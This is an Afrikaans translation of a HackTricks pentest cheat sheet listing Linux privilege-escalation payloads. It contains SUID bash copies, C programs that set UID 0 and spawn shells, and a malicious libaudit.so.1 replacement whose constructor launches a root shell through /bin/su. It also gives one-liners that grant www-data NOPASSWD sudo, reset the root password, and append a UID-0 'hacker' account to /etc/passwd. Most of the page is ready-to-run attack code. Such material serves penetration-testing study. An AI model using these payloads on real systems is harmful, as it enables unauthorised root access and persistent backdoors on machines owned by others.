# Payloads om uit te voer

{{#include ../../banners/hacktricks-training.md}}

## Bash

`bash -p` aktiveer privileged mode: wanneer Bash met verskillende werklike en effektiewe ID's begin, stel dit nie die effektiewe ID na die werklike ID terug nie. Die resulterende shell hang steeds van die oproeper se bestaande credentials af.<sup>[[1]](#references)[[3]](#references)</sup>
```bash
cp /bin/bash /tmp/b && chmod +s /tmp/b
/bin/b -p #Maintains root privileges from suid, working in debian & buntu
```
## C

`setresuid` verander die werklike, effektiewe en gestoorde ID's wanneer dit toegelaat word, terwyl `setuid` die effektiewe ID verander en moontlik ook die werklike en gestoorde ID's vir 'n bevoorregte oproeper stel. `execve` vervang die huidige prosesbeeld met die aangevraagde program.<sup>[[2]](#references)[[3]](#references)[[4]](#references)</sup> Hierdie voorbeelde laat terugkeerwaardetoetse weg; albei credential calls kan misluk, selfs vir UID 0.<sup>[[2]](#references)[[3]](#references)</sup>
```c
//gcc payload.c -o payload
int main(void){
setresuid(0, 0, 0); //Set as user suid user
system("/bin/sh");
return 0;
}
```

```c
//gcc payload.c -o payload
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

int main(){
setuid(getuid());
system("/bin/bash");
return 0;
}
```

```c
// Privesc to user id: 1000
#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>

int main(void) {
char *const paramList[10] = {"/bin/bash", "-p", NULL};
const int id = 1000;
setresuid(id, id, id);
execve(paramList[0], paramList, NULL);
return 0;
}
```
## Oorskryf van ’n lêer om privileges te eskaleer

### Algemene lêers

Dit is algemene plaaslike lêers en koppelvlakke vir privilege-beheer: `/etc/passwd` stoor rekeningrekords met sewe velde, `/etc/shadow` stoor opsionele geënkripteerde wagwoorddata, `sudoers` definieer sudo-privileges en tags soos `NOPASSWD`, en Docker se verstek-daemon endpoint is ’n Unix-socket by `/var/run/docker.sock`; toegang tot daardie socket kan root-vlak-beheer oor sy host verleen.<sup>[[5]](#references)[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Voeg gebruiker met wagwoord by _/etc/passwd_
- Verander wagwoord binne _/etc/shadow_
- Voeg gebruiker by sudoers in _/etc/sudoers_
- Misbruik Docker deur die Docker-socket, gewoonlik in _/run/docker.sock_ of _/var/run/docker.sock_

### Oorskryf van ’n library

Kontroleer watter shared libraries ’n binary gebruik; in hierdie voorbeeld, inspekteer `/bin/su` met `ldd`.<sup>[[9]](#references)</sup>
```bash
ldd /bin/su
linux-vdso.so.1 (0x00007ffef06e9000)
libpam.so.0 => /lib/x86_64-linux-gnu/libpam.so.0 (0x00007fe473676000)
libpam_misc.so.0 => /lib/x86_64-linux-gnu/libpam_misc.so.0 (0x00007fe473472000)
libaudit.so.1 => /lib/x86_64-linux-gnu/libaudit.so.1 (0x00007fe473249000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fe472e58000)
libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007fe472c54000)
libcap-ng.so.0 => /lib/x86_64-linux-gnu/libcap-ng.so.0 (0x00007fe472a4f000)
/lib64/ld-linux-x86-64.so.2 (0x00007fe473a93000)
```
`ldd` rapporteer afhanklikhede van shared objects, terwyl die dynamic linker ELF-metadata en sy soekreëls gebruik om hulle tydens runtime te laai.<sup>[[9]](#references)[[10]](#references)</sup>

Om een kandidaat te inspekteer, gebruik `objdump -T` om die dynamic symbol table van `su` te druk en vir audit name te filter.<sup>[[11]](#references)</sup>
```bash
objdump -T /bin/su | grep audit
0000000000000000      DF *UND*  0000000000000000              audit_open
0000000000000000      DF *UND*  0000000000000000              audit_log_user_message
0000000000000000      DF *UND*  0000000000000000              audit_log_acct_message
000000000020e968 g    DO .bss   0000000000000004  Base        audit_fd
```
`audit_open`, `audit_log_user_message` en `audit_log_acct_message` is libaudit-funksies; `audit_fd` word in hierdie uitvoer as ’n data-object gedefinieer in `su` se `.bss` getoon.<sup>[[12]](#references)[[13]](#references)[[14]](#references)</sup> ’n Vervangingsbiblioteek moet versoenbare definisies vir die ongedefinieerde simbole uitvoer wat die loader resolve; funksie-/data-ABI’s wat nie ooreenstem nie, kan steeds veroorsaak dat die proses misluk wanneer daardie simbole relocated of called word.<sup>[[10]](#references)[[11]](#references)</sup>

GCC se `constructor`-attribute veroorsaak dat `inject` outomaties voor `main` op ondersteunde targets called word.<sup>[[15]](#references)</sup>
```c
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>

//gcc -shared -o /lib/x86_64-linux-gnu/libaudit.so.1 -fPIC inject.c

int audit_open;
int audit_log_acct_message;
int audit_log_user_message;
int audit_fd;

void inject()__attribute__((constructor));

void inject()
{
setuid(0);
setgid(0);
system("/bin/bash");
}
```
As die vervanging suksesvol deur ’n bevoorregte **`/bin/su`**-proses gelaai word, kan hierdie constructor **`/bin/bash`** met daardie proses se privileges begin; die presiese resultaat hang van die omgewing af.<sup>[[10]](#references)[[15]](#references)</sup>

## Skripte

Kan jy root iets laat execute?

`sudoers` gebruik die `NOPASSWD`-tag in policy entries, `chpasswd` lees `user:password`-pare vanaf standaardinvoer, en `/etc/passwd` gebruik sewe kolon-geskeide account fields; die volgende voorbeelde neem aan dat die relevante lêers writable is deur die proses wat hulle uitvoer.<sup>[[5]](#references)[[6]](#references)[[16]](#references)</sup>

### **www-data na sudoers**
```bash
echo 'chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD:ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' > /tmp/update
```
### **Verander root-wagwoord**
```bash
echo "root:hacked" | chpasswd
```
### Voeg nuwe root-gebruiker by /etc/passwd

Die finale payload hang af van 'n teiken wat die gegenereerde `crypt`-hash aanvaar: Debian se `mkpasswd -m sha-512` gebruik SHA-512 crypt (`$6$`), terwyl OpenSSL se `passwd -1 -salt` die MD5-gebaseerde BSD-algoritme gebruik (`$1$`).<sup>[[17]](#references)[[18]](#references)</sup>
```bash
echo hacker:$((mkpasswd -m SHA-512 myhackerpass || openssl passwd -1 -salt mysalt myhackerpass || echo '$1$mysalt$7DTZJIc9s6z60L6aj0Sui.') 2>/dev/null):0:0::/:/bin/bash >> /etc/passwd
```
## References

- [1] [Die Set Builtin (Bash Reference Manual)](https://www.gnu.org/s/bash/manual/html_node/The-Set-Builtin.html)
- [2] [setresuid(2) — Linux-handleidingblad](https://man7.org/linux/man-pages/man2/setresuid.2.html)
- [3] [setuid(2) — Linux-handleidingblad](https://man7.org/linux/man-pages/man2/setuid.2.html)
- [4] [execve(2) — Linux-handleidingblad](https://man7.org/linux/man-pages/man2/execve.2.html)
- [5] [passwd(5) — Linux-handleidingblad](https://man7.org/linux/man-pages/man5/passwd.5.html)
- [6] [sudoers(5) — Debian Manpages](https://manpages.debian.org/testing/sudo/sudoers.5.en.html)
- [7] [Beskerm die Docker-daemonsok](https://docs.docker.com/engine/security/protect-access/)
- [8] [dockerd — Docker Docs](https://docs.docker.com/reference/cli/dockerd/)
- [9] [ldd(1) — Linux-handleidingblad](https://man7.org/linux/man-pages/man1/ldd.1.html)
- [10] [ld.so(8) — Linux-handleidingblad](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [11] [objdump (GNU Binary Utilities)](https://sourceware.org/binutils/docs/binutils/objdump.html)
- [12] [audit_open(3) — Debian Manpages](https://manpages.debian.org/trixie/libaudit-dev/audit_open.3.en.html)
- [13] [audit_log_user_message(3) — Debian Manpages](https://manpages.debian.org/testing/libaudit-dev/audit_log_user_message.3.en.html)
- [14] [audit_log_acct_message(3) — Debian Manpages](https://manpages.debian.org/testing/libaudit-dev/audit_log_acct_message.3.en.html)
- [15] [Algemene Attributes (Using the GNU Compiler Collection)](https://gcc.gnu.org/onlinedocs/gcc/Common-Attributes.html)
- [16] [chpasswd(8) — Linux-handleidingblad](https://man7.org/linux/man-pages/man8/chpasswd.8.html)
- [17] [mkpasswd.c — Debian Sources](https://sources.debian.org/src/whois/5.5.17/mkpasswd.c)
- [18] [openssl-passwd — OpenSSL Documentation](https://docs.openssl.org/master/man1/openssl-passwd/)
{{#include ../../banners/hacktricks-training.md}}
